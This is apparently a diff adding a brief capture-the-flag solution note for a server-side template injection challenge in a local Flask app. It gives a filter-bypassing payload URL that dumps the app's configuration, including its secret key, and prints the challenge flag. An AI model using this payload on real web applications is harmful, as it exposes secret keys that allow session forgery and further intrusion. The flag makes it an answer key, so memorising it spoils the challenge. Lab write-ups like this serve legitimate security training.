@@ -1,0 +1,10 @@
+SSTI:
+
+in the url you must input /adminpage?search={{"COMMAND"}}
+
+config and self are filtered along with ().
+
+To get the Secret key for the app = http://127.0.0.1:5000/adminpage?search={{url_for.__globals__.current_app.config}}
+
+retroCTF{"s3rV3RR_1s_V2n6e2ra3le"}
+
